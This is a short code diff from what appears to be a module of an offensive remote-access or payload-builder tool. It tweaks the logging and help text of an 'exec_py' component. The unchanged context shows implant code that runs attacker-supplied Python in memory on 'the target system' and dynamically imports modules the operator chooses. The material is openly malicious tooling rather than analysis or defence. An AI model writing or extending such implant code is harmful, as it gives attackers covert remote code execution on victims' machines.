@@ -13,10 +13,10 @@ def main(self, option, extra_input=None):
                 try:
                     if module_to_load != "":
                         exec('import ' + module_to_load)
-                        self.log.pos("Valid module, loaded on")
+                        self.log.pos(f"Valid module: {module_to_load}, loaded on")
                         self.config.import_statements.append('import ' + module_to_load)
                 except (ImportError, SyntaxError):
-                    self.log.err("Invalid module, not loaded on")
+                    self.log.war(f"Invalid module: {module_to_load}, not loaded on")
         self.config.functions.append('''
 def exec_py(command):
     command = command.split(' ', 1)[1]
@@ -35,10 +35,7 @@ def exec_py(command):
             elif command == "exec_py":
                 exec_py(data)''')
         self.config.help_menu['exec_py <python command>'] = 'Execute in-memory arbitrary python code on the target system'
-        self.config.help_menu[
-            'exec_py_script'] = 'Script in the terminal a block of in-memory arbitrary python code to execute on the target system'
-        self.config.help_menu[
-            'exec_py_file <Local file path>'] = 'Execute arbitrary python code from a file to execute on the target system in-memory'
+        self.config.help_menu['exec_py_file <Local file path>'] = 'Execute arbitrary python code from a file to execute on the target system in-memory'
     elif option == 'info':
         self.log.blank('\nName             : Execute python component' \
                   '\nOS               : Windows' \
